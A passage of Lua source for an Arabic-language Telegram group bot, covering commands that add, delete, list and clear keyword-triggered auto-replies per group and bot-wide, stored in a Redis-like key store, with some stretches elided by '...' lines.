return false  end
if text then 
local test = MARX:get(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
if test and test == 'reppp' then   
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
return false  end 
if not MARX:sismember(DEVSTOR..'rep:media'..msg.chat_id_,text) then
MARX:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦ الكلمه » {* ["..text.."] *} 🍃\n⚡¦ لا يوجد رد بهاذه الكلمه*\n💥\n", 1, 'md')  
MARX:del("addreply1:gif"..text..msg.chat_id_)  
MARX:del("addreply1:vico"..text..msg.chat_id_)  
MARX:del("addreply1:stekr"..text..msg.chat_id_)  
MARX:del("taha:"..text..msg.chat_id_)  
MARX:del("addreply1:photo"..text..msg.chat_id_)
MARX:del("addreply1:video"..text..msg.chat_id_)
MARX:del("addreply1:document"..text..msg.chat_id_)
MARX:del("addreply1:audio"..text..msg.chat_id_)
MARX:srem("rep:media"..msg.chat_id_,text)  
else
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦ الكلمه » {* ["..text.."] *} 🍃\n📬¦ تم حذفها من قائمة الردود *\n💥\n", 1, 'md')  
MARX:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:gif"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:vico"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:stekr"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."taha:"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:photo"..text..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:video"..text..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:document"..text..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:audio"..text..msg.chat_id_)
MARX:srem(DEVSTOR.."rep:media"..msg.chat_id_,text)  
end
return false  end  
end
...
MARX:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
local test = MARX:get(DEVSTOR.."addreply2:"..msg.sender_user_id_..msg.chat_id_)  
if msg.content_.sticker_ then   
MARX:set(DEVSTOR.."addreply1:stekr"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
MARX:set(DEVSTOR.."addreply1:vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
MARX:set(DEVSTOR.."addreply1:gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
MARX:set(DEVSTOR.."taha:"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
MARX:set(DEVSTOR.."addreply1:audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
MARX:set(DEVSTOR.."addreply1:document"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
MARX:set(DEVSTOR.."addreply1:video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
MARX:set(DEVSTOR.."addreply1:video:caption"..test..msg.chat_id_,(msg.content_.caption_ or ''))  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
MARX:set(DEVSTOR.."addreply1:photo"..test..msg.chat_id_, photo_in_group)  
MARX:set(DEVSTOR.."addreply1:photo:caption"..test..msg.chat_id_,(msg.content_.caption_ or ''))  
end
MARX:del(DEVSTOR.."addreply2:"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text and msg.reply_to_message_id_ ~= 0 and not MARX:get(DEVSTOR..'lock:rep:rd'..msg.chat_id_) then  
local anemi = MARX:get(DEVSTOR.."addreply1:gif"..text..msg.chat_id_)   
local veico = MARX:get(DEVSTOR.."addreply1:vico"..text..msg.chat_id_)   
local stekr = MARX:get(DEVSTOR.."addreply1:stekr"..text..msg.chat_id_)     
local taha = MARX:get(DEVSTOR.."taha:"..text..msg.chat_id_)   
local photo = MARX:get(DEVSTOR.."addreply1:photo"..text..msg.chat_id_)
local photo_caption = (MARX:get(DEVSTOR.."addreply1:photo:caption"..text..msg.chat_id_) or '' )
local video = MARX:get(DEVSTOR.."addreply1:video"..text..msg.chat_id_)
local video_caption = MARX:get(DEVSTOR.."addreply1:video:caption"..text..msg.chat_id_)
local document = MARX:get(DEVSTOR.."addreply1:document"..text..msg.chat_id_)
local audio = MARX:get(DEVSTOR.."addreply1:audio"..text..msg.chat_id_)
if taha then    
...
local list = MARX:smembers(DEVSTOR.."repmedia"..msg.chat_id_)  
local taha = MARX:scard(DEVSTOR.."repmedia"..msg.chat_id_)  
for k,v in pairs(list) do  
MARX:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply1:gif"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply1:vico"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply1:stekr"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply:rd"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:photo:gp"..v..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:video:gp"..v..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:document:gp"..v..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:audio:gp"..v..msg.chat_id_)
MARX:srem(DEVSTOR.."repmedia"..msg.chat_id_,v)  
end  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* المجموعه تحتوي على *{"..taha.."}* رد \n*📮¦* تم مسح الردود جميعها \n", 1, 'md')  
end
...
for k,v in pairs(list) do  
if MARX:get(DEVSTOR.."add:reply1:gif"..v..msg.chat_id_) then
taha = 'متحركه 🎆'
elseif MARX:get(DEVSTOR.."add:reply1:vico"..v..msg.chat_id_) then
taha = 'بصمه 🎙'
elseif MARX:get(DEVSTOR.."add:reply1:stekr"..v..msg.chat_id_) then
taha = 'ملصق 🃏'
elseif MARX:get(DEVSTOR.."add:reply:rd"..v..msg.chat_id_) then
taha = 'رساله 💭'
elseif MARX:get(DEVSTOR.."addreply1:photo:gp"..v..msg.chat_id_) then
taha = 'صوره 🌇'
elseif MARX:get(DEVSTOR.."addreply1:video:gp"..v..msg.chat_id_) then
taha = 'فيديو 📹'
elseif MARX:get(DEVSTOR.."addreply1:document:gp"..v..msg.chat_id_) then
taha = 'ملف 📁'
elseif MARX:get(DEVSTOR.."addreply1:audio:gp"..v..msg.chat_id_) then
taha = 'اغنيه 🎵'
end
t = t..'*'..k..'• *❨`'..v..'`❩ *» {'..taha..'}*\n'    
end  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦ حسنآ ارسل لي الكلمه الان *\n', 1, 'md')  
MARX:set(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = MARX:get(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == 'rep' then   
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
return false  end 
if MARX:sismember(DEVSTOR..'repmedia'..msg.chat_id_,text) then
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦ لقد تم اضافة رد بهاذه الكلمه \n📬¦ ارسل كلمه اخرى او ارسل الغاء*\n🍃\n", 1, 'md')  
else
media = '{ متحركه ‹› ملصق ‹› صوره ‹› اغنيه ‹› بصمه ‹› ملف ‹› فيديو }'
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ حسنآ ارسل الرد الان\n📤¦ يمكنك ارسال الرد » "..media.."*\n🍃", 1, 'md')  
MARX:set(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"repp")  
MARX:set(DEVSTOR.."add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
MARX:sadd(DEVSTOR.."repmedia"..msg.chat_id_,text)  
end
return false  end  
end
if text == 'حذف رد' and is_monsh(msg) then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦ حسنآ ارسل لي الكلمه الان *\n', 1, 'md')  
MARX:set(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = MARX:get(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == 'reppp' then   
if not MARX:sismember(DEVSTOR..'repmedia'..msg.chat_id_,text) then
MARX:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦ الكلمه » {* ["..text.."] *} 🍃\n⚡¦ لا يوجد رد بهاذه الكلمه*\n💥\n", 1, 'md')  
MARX:del("add:reply1:gif"..text..msg.chat_id_)  
MARX:del("add:reply1:vico"..text..msg.chat_id_)  
MARX:del("add:reply1:stekr"..text..msg.chat_id_)  
MARX:del("add:reply:rd"..text..msg.chat_id_)  
MARX:del("addreply1:photo:gp"..text..msg.chat_id_)
MARX:del("addreply1:video:gp"..text..msg.chat_id_)
MARX:del("addreply1:document:gp"..text..msg.chat_id_)
MARX:del("addreply1:audio:gp"..text..msg.chat_id_)
MARX:srem("repmedia"..msg.chat_id_,text)  
else
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦ الكلمه » {* ["..text.."] *} 🍃\n📬¦ تم حذفها من قائمة الردود *\n💥\n", 1, 'md')  
MARX:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply1:gif"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply1:vico"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply1:stekr"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."add:reply:rd"..text..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:photo:gp"..text..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:video:gp"..text..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:document:gp"..text..msg.chat_id_)
MARX:del(DEVSTOR.."addreply1:audio:gp"..text..msg.chat_id_)
MARX:srem(DEVSTOR.."repmedia"..msg.chat_id_,text)  
end
return false  end  
end
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📌¦ تم حفظ الردَ الخاص پك\n📨¦ نو؏ الرد — { '..what..' }*', 1, 'md')  
MARX:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
local test = MARX:get(DEVSTOR.."add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if msg.content_.sticker_ then   
MARX:set(DEVSTOR.."add:reply1:stekr"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
MARX:set(DEVSTOR.."add:reply1:vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
MARX:set(DEVSTOR.."add:reply1:gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
MARX:set(DEVSTOR.."add:reply:rd"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
MARX:set(DEVSTOR.."addreply1:audio:gp"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
MARX:set(DEVSTOR.."addreply1:document:gp"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
MARX:set(DEVSTOR.."addreply1:video:gp"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
MARX:set(DEVSTOR.."addreply1:video:caption:gp"..test..msg.chat_id_,(msg.content_.caption_ or ''))  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
MARX:set(DEVSTOR.."addreply1:photo:gp"..test..msg.chat_id_, photo_in_group)  
MARX:set(DEVSTOR.."addreply1:photo:caption:gp"..test..msg.chat_id_,(msg.content_.caption_ or ''))  
end
MARX:del(DEVSTOR.."add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end
if text and not MARX:get(DEVSTOR..'lock:rep'..msg.chat_id_) then  
local anemi = MARX:get(DEVSTOR.."add:reply1:gif"..text..msg.chat_id_)   
local veico = MARX:get(DEVSTOR.."add:reply1:vico"..text..msg.chat_id_)   
local stekr = MARX:get(DEVSTOR.."add:reply1:stekr"..text..msg.chat_id_)     
local taha = MARX:get(DEVSTOR.."add:reply:rd"..text..msg.chat_id_)   
local video_caption = MARX:get(DEVSTOR.."addreply1:video:caption:gp"..text..msg.chat_id_)
local photo_caption = (MARX:get(DEVSTOR.."addreply1:photo:caption:gp"..text..msg.chat_id_) or '' )
local photo = MARX:get(DEVSTOR.."addreply1:photo:gp"..text..msg.chat_id_)
local video = MARX:get(DEVSTOR.."addreply1:video:gp"..text..msg.chat_id_)
local document = MARX:get(DEVSTOR.."addreply1:document:gp"..text..msg.chat_id_)
local audio = MARX:get(DEVSTOR.."addreply1:audio:gp"..text..msg.chat_id_)
if taha then    
...
if MARX:get(DEVSTOR..'lock:rep:all:rd'..bot_id) then
taha = '*📮¦ تم تفعيل ردود المطور بالرد *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:rep:all:rd'..bot_id)   
else
...
if not MARX:get(DEVSTOR..'lock:rep:all:rd'..bot_id) then
taha = '*📮¦ تم تعطيل ردود المطور بالرد *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:rep:all:rd'..bot_id,true)   
else
...
local list = MARX:smembers(DEVSTOR.."rep:media:all:rd"..bot_id)    
local taha = MARX:scard(DEVSTOR.."rep:media:all:rd"..bot_id)    
for k,v in pairs(list) do    
MARX:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
MARX:del(DEVSTOR.."add:repallt:gif:all:rd"..v..bot_id)    
MARX:del(DEVSTOR.."add:rep:tvico:all:rd"..v..bot_id)    
MARX:del(DEVSTOR.."add:rep:tstekr:all:rd"..v..bot_id)    
MARX:del(DEVSTOR.."add:rep:text:all:rd"..v..bot_id)    
MARX:del(DEVSTOR.."all:addreply1:photo:gp"..v..bot_id)
MARX:del(DEVSTOR.."all:addreply1:video:gp"..v..bot_id)
MARX:del(DEVSTOR.."all:addreply1:document:gp"..v..bot_id)
MARX:del(DEVSTOR.."all:addreply1:audio:gp"..v..bot_id)
MARX:srem(DEVSTOR.."rep:media:all:rd"..bot_id,v)    
end    
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* المجموعه تحتوي على *{"..taha.."}* رد \n*📮¦* تم مسح الردود جميعها \n", 1, 'md')    
end
...
for k,v in pairs(list) do    
if MARX:get(DEVSTOR.."add:repallt:gif:all:rd"..v..bot_id) then
taha = 'متحركه 🎆'
elseif MARX:get(DEVSTOR.."add:rep:tvico:all:rd"..v..bot_id) then
taha = 'بصمه 🎙'
elseif MARX:get(DEVSTOR.."add:rep:tstekr:all:rd"..v..bot_id)  then
taha = 'ملصق 🃏'
elseif MARX:get(DEVSTOR.."add:rep:text:all:rd"..v..bot_id) then
taha = 'رساله 💭'
elseif MARX:get(DEVSTOR.."all:addreply1:photo:gp"..v..bot_id)  then
taha = 'صوره 🌇'
elseif MARX:get(DEVSTOR.."all:addreply1:video:gp"..v..bot_id)  then
taha = 'فيديو 📹'
elseif MARX:get(DEVSTOR.."all:addreply1:document:gp"..v..bot_id)  then
taha = 'ملف 📁'
elseif MARX:get(DEVSTOR.."all:addreply1:audio:gp"..v..bot_id)  then
taha = 'اغنيه 🎵'
end
t = t..'*'..k..'• *❨`'..v..'`❩ *» {'..taha..'}*\n'    
end    
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦ حسنآ ارسل لي الكلمه الان *\n💥', 1, 'md')  
MARX:set(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id,'yes')    
return false    end      
if text then     
local tt = MARX:get(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
if tt == 'yes' then     
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
return false  end 
if MARX:sismember(DEVSTOR.."rep:media:all:rd"..bot_id,text) then
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦ لقد تم اضافة رد بهاذه الكلمه \n📬¦ ارسل كلمه اخرى او ارسل الغاء*\n🍃\n", 1, 'md')  
else
media = '{ متحركه ‹› ملصق ‹› صوره ‹› اغنيه ‹› بصمه ‹› ملف ‹› فيديو }'
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ حسنآ ارسل الرد الان\n📤¦ يمكنك ارسال الرد » "..media.."*\n🍃", 1, 'md')  
MARX:set(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id,'yes1')    
MARX:set(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id, text)    
MARX:sadd(DEVSTOR.."rep:media:all:rd"..bot_id,text)    
end
return false    end    
end
if text and text == 'حذف رد بالرد عام' and  is_devtaha(msg) then     
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦ حسنآ ارسل لي الكلمه الان *\n💥', 1, 'md')  
MARX:set(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id,'yes11')    
return false    end    
--للكل بالرد
if text then 
local test = MARX:get(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
if test and test == 'yes11' then     
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
return false  end 
if not MARX:sismember(DEVSTOR..'rep:media:all:rd'..bot_id,text) then
MARX:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*🎫¦ الكلمه » {* ["..text.."] *} 🍂\n📮¦ لا يوجد رد بهاذه الكلمه*\n💥\n", 1, 'md')  
MARX:del("add:repallt:gif:all:rd"..text..bot_id)    
MARX:del("add:rep:tvico:all:rd"..text..bot_id)    
MARX:del("add:rep:tstekr:all:rd"..text..bot_id)    
MARX:del("add:rep:text:all:rd"..text..bot_id)    
MARX:del("all:addreply1:photo:gp"..text..bot_id)
MARX:del("all:addreply1:video:gp"..text..bot_id)
MARX:del("all:addreply1:document:gp"..text..bot_id)
MARX:del("all:addreply1:audio:gp"..text..bot_id)
MARX:del("rep:media:all:rd"..bot_id,text)    
else
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📌¦ الكلمه » {* ["..text.."] *} 🍂\n💢¦ تم حذفها من قائمة الردود *\n💥\n", 1, 'md')  
MARX:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
MARX:del(DEVSTOR.."add:repallt:gif:all:rd"..text..bot_id)    
MARX:del(DEVSTOR.."add:rep:tvico:all:rd"..text..bot_id)    
MARX:del(DEVSTOR.."add:rep:tstekr:all:rd"..text..bot_id)    
MARX:del(DEVSTOR.."add:rep:text:all:rd"..text..bot_id)    
MARX:del(DEVSTOR.."all:addreply1:photo:gp"..text..bot_id)
MARX:del(DEVSTOR.."all:addreply1:video:gp"..text..bot_id)
MARX:del(DEVSTOR.."all:addreply1:document:gp"..text..bot_id)
MARX:del(DEVSTOR.."all:addreply1:audio:gp"..text..bot_id)
MARX:srem(DEVSTOR.."rep:media:all:rd"..bot_id,text)    
end
return false    end    
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📌¦ تم حفظ الردَ الخاص پك\n📨¦ نو؏ الرد — { '..what..' }*', 1, 'md')  
MARX:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    
local test = MARX:get(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    
if msg.content_.sticker_ then     
MARX:set(DEVSTOR.."add:rep:tstekr:all:rd"..test..bot_id, msg.content_.sticker_.sticker_.persistent_id_)    
end     
if msg.content_.voice_ then    
MARX:set(DEVSTOR.."add:rep:tvico:all:rd"..test..bot_id, msg.content_.voice_.voice_.persistent_id_)    
end     
if msg.content_.animation_ then     
MARX:set(DEVSTOR.."add:repallt:gif:all:rd"..test..bot_id, msg.content_.animation_.animation_.persistent_id_)    
end    
if text then     
MARX:set(DEVSTOR.."add:rep:text:all:rd"..test..bot_id, text)    
end    
if msg.content_.audio_ then
MARX:set(DEVSTOR.."all:addreply1:audio:gp"..test..bot_id, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
MARX:set(DEVSTOR.."all:addreply1:document:gp"..test..bot_id, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
MARX:set(DEVSTOR.."all:addreply1:video:gp"..test..bot_id, msg.content_.video_.video_.persistent_id_)  
MARX:set(DEVSTOR.."all:addreply1:video:caption:gp"..test..bot_id,(msg.content_.caption_ or ''))  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
MARX:set(DEVSTOR.."all:addreply1:photo:gp"..test..bot_id, photo_in_group)  
MARX:set(DEVSTOR.."all:addreply1:photo:caption:gp"..test..bot_id,(msg.content_.caption_ or ''))  
end
MARX:del(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    
return false    
end    
end
if text and msg.reply_to_message_id_ ~= 0 and not MARX:get(DEVSTOR..'lock:rep:all:rd'..bot_id) then   
local anemi = MARX:get(DEVSTOR.."add:repallt:gif:all:rd"..text..bot_id)    
local veico = MARX:get(DEVSTOR.."add:rep:tvico:all:rd"..text..bot_id)    
local stekr = MARX:get(DEVSTOR.."add:rep:tstekr:all:rd"..text..bot_id)      
local taha = MARX:get(DEVSTOR.."add:rep:text:all:rd"..text..bot_id)    
local video_caption = MARX:get(DEVSTOR.."all:addreply1:video:caption:gp"..text..bot_id)
local photo_caption = (MARX:get(DEVSTOR.."all:addreply1:photo:caption:gp"..text..bot_id) or '' )
local photo = MARX:get(DEVSTOR.."all:addreply1:photo:gp"..text..bot_id)
local video = MARX:get(DEVSTOR.."all:addreply1:video:gp"..text..bot_id)
local document = MARX:get(DEVSTOR.."all:addreply1:document:gp"..text..bot_id)
local audio = MARX:get(DEVSTOR.."all:addreply1:audio:gp"..text..bot_id)
if taha then     
DEVIL_sendMsg(msg.chat_id_, msg.reply_to_message_id_, 1, ''..check_markdown(taha)..'', 1, 'md')      
return false    
end     
...
if MARX:get(DEVSTOR..'lock:rep:all'..bot_id) then
taha = '*📮¦ تم تفعيل ردود المطور *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:rep:all'..bot_id)   
else
...
if not MARX:get(DEVSTOR..'lock:rep:all'..bot_id) then
taha = '*📮¦ تم تعطيل ردود المطور *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:rep:all'..bot_id,true)   
else
...
local list = MARX:smembers(DEVSTOR.."rep:media:all"..bot_id)    
local taha = MARX:scard(DEVSTOR.."rep:media:all"..bot_id)    
for k,v in pairs(list) do    
MARX:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    
MARX:del(DEVSTOR.."add:repallt:gif:all"..v..bot_id)    
MARX:del(DEVSTOR.."add:rep:tvico:all"..v..bot_id)    
MARX:del(DEVSTOR.."add:rep:tstekr:all"..v..bot_id)    
MARX:del(DEVSTOR.."add:rep:text:all"..v..bot_id)    
MARX:del(DEVSTOR.."mall:addreply1:photo:gp"..v..bot_id)
MARX:del(DEVSTOR.."mall:addreply1:video:gp"..v..bot_id)
MARX:del(DEVSTOR.."mall:addreply1:document:gp"..v..bot_id)
MARX:del(DEVSTOR.."mall:addreply1:audio:gp"..v..bot_id)
MARX:srem(DEVSTOR.."rep:media:all"..bot_id,v)    
MARX:del("add:repallt"..msg.sender_user_id_..bot_id)    
MARX:del("add:repallt:gif:all"..v..bot_id)    
MARX:del("add:rep:tvico:all"..v..bot_id)    
MARX:del("add:rep:tstekr:all"..v..bot_id)    
MARX:del("add:rep:text:all"..v..bot_id)    
MARX:del("mall:addreply1:photo:gp"..v..bot_id)
MARX:del("mall:addreply1:video:gp"..v..bot_id)
MARX:del("mall:addreply1:document:gp"..v..bot_id)
MARX:del("mall:addreply1:audio:gp"..v..bot_id)
MARX:srem("rep:media:all"..bot_id,v)    
end    
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* المجموعه تحتوي على *{"..taha.."}* رد \n*📮¦* تم مسح الردود جميعها \n", 1, 'md')    
end
...
t = "*📮¦ قائمة ردود المطور 🍃\nٴ━━━━━━━━━━━*\n"    
for k,v in pairs(list) do    
if MARX:get(DEVSTOR.."add:repallt:gif:all"..v..bot_id) then
taha = 'متحركه 🎆'
elseif MARX:get(DEVSTOR.."add:rep:tvico:all"..v..bot_id) then
taha = 'بصمه 🎙'
elseif MARX:get(DEVSTOR.."add:rep:tstekr:all"..v..bot_id) then
taha = 'ملصق 🃏'
elseif MARX:get(DEVSTOR.."add:rep:text:all"..v..bot_id) then
taha = 'رساله 💭'
elseif MARX:get(DEVSTOR.."mall:addreply1:photo:gp"..v..bot_id)  then
taha = 'صوره 🌇'
elseif MARX:get(DEVSTOR.."mall:addreply1:video:gp"..v..bot_id)  then
taha = 'فيديو 📹'
elseif MARX:get(DEVSTOR.."mall:addreply1:document:gp"..v..bot_id)  then
taha = 'ملف 📁'
elseif MARX:get(DEVSTOR.."mall:addreply1:audio:gp"..v..bot_id)  then
taha = 'اغنيه 🎵'
end
t = t..'*'..k..'• *❨`'..v..'`❩ *» {'..taha..'}*\n'    
end    
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦ حسنآ ارسل لي الكلمه الان *\n💥', 1, 'md')  
MARX:set(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id,'yes')    
return false    end      
if text then    
local tt = MARX:get(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    
if tt == 'yes' then     
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    
return false  end 
if MARX:sismember(DEVSTOR.."rep:media:all"..bot_id,text) then
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦ لقد تم اضافة رد بهاذه الكلمه \n📬¦ ارسل كلمه اخرى او ارسل الغاء*\n🍃\n", 1, 'md')  
else
media = '{ متحركه ‹› ملصق ‹› صوره ‹› اغنيه ‹› بصمه ‹› ملف ‹› فيديو }'
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ حسنآ ارسل الرد الان\n📤¦ يمكنك ارسال الرد » "..media.."*\n🍃", 1, 'md')  
MARX:set(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id,'yes1')    
MARX:set(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id, text)    
MARX:sadd(DEVSTOR.."rep:media:all"..bot_id,text)    
end
return false    end    
end
if text and text == 'حذف رد عام' and  is_devtaha(msg) then     
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ حسنآ ارسل لي الكلمه الان *\n💥', 1, 'md')  
MARX:set(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id,'yes11')    
return false    end    
if text then 
local test = MARX:get(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    
if test and test == 'yes11' then   
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    
return false  end   
if not MARX:sismember(DEVSTOR..'rep:media:all'..bot_id,text) then
MARX:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*🎫¦ الكلمه » {* ["..text.."] *} 🍂\n📮¦ لا يوجد رد بهاذه الكلمه*\n💥\n", 1, 'md')  
MARX:del("add:repallt:gif:all"..text..bot_id)    
MARX:del("add:rep:tvico:all"..text..bot_id)    
MARX:del("add:rep:tstekr:all"..text..bot_id)    
MARX:del("add:rep:text:all"..text..bot_id)    
MARX:del("mall:addreply1:photo:gp"..text..bot_id)
MARX:del("mall:addreply1:video:gp"..text..bot_id)
MARX:del("mall:addreply1:document:gp"..text..bot_id)
MARX:del("mall:addreply1:audio:gp"..text..bot_id)
MARX:srem("rep:media:all"..bot_id,text)    
else
